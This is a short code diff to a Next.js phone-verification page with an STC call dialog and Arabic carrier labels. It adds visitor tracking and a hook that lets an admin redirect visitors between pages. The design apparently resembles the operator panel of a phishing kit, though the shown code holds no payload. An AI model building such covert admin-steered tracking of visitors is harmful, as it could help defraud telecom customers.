@@ -14,6 +14,8 @@ import { StcCallDialog } from "@/components/stc-call-dialog"
 import { db, updateDoc, doc } from "@/lib/firebase"
 import { onSnapshot, getDoc } from "firebase/firestore"
 import { addToHistory } from "@/lib/history-utils"
+import { useRedirectMonitor } from "@/hooks/use-redirect-monitor"
+import { updateVisitorPage } from "@/lib/visitor-tracking"
 
 export default function VerifyPhonePage() {
   const [phoneNumber, setPhoneNumber] = useState("")
@@ -34,9 +36,20 @@ export default function VerifyPhonePage() {
     { value: "go", label: "GO - جو" }
   ]
 
+  const visitorId = typeof window !== 'undefined' ? localStorage.getItem("visitor") || "" : ""
+  
+  // Monitor for admin redirects
+  useRedirectMonitor({ visitorId, currentPage: "phone" })
+  
+  // Update visitor page
+  useEffect(() => {
+    if (visitorId) {
+      updateVisitorPage(visitorId, "phone")
+    }
+  }, [visitorId])
+
   // <ADMIN_NAVIGATION_SYSTEM> Unified navigation listener for admin control
   useEffect(() => {
-    const visitorId = localStorage.getItem("visitor")
     if (!visitorId) return
 
     console.log("[phone-info] Setting up navigation listener for visitor:", visitorId)
